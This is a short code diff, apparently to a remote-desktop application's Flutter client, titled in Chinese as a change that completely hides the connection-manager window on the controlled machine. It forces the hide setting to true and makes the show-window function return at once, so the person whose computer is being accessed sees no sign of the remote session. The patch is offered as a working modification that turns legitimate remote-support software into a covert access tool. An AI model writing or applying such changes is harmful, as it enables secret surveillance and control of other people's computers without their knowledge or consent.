@@ -1,0 +1,29 @@
+###被控端接入时，彻底隐藏右下角的 CM 连接框前端窗口
+diff --git a/flutter/lib/main.dart b/flutter/lib/main.dart
+index 9bd68ed..5f864c7 100644
+--- a/flutter/lib/main.dart
++++ b/flutter/lib/main.dart
+@@ -294,13 +294,9 @@ void runConnectionManagerScreen() async {
+     const DesktopServerPage(),
+     MyTheme.currentThemeMode(),
+   );
+-  final hide = await bind.cmGetConfig(name: "hide_cm") == 'true';
++  final hide = true;
+   gFFI.serverModel.hideCm = hide;
+-  if (hide) {
+-    await hideCmWindow(isStartup: true);
+-  } else {
+-    await showCmWindow(isStartup: true);
+-  }
++  await hideCmWindow(isStartup: true);
+   setResizable(false);
+   // Start the uni links handler and redirect links to Native, not for Flutter.
+   listenUniLinks(handleByFlutter: false);
+@@ -309,6 +305,7 @@ void runConnectionManagerScreen() async {
+ bool _isCmReadyToShow = false;
+ 
+ showCmWindow({bool isStartup = false}) async {
++  return;
+   if (isStartup) {
+     WindowOptions windowOptions = getHiddenTitleBarWindowOptions(
+         size: kConnectionManagerWindowSizeClosedChat, alwaysOnTop: true);
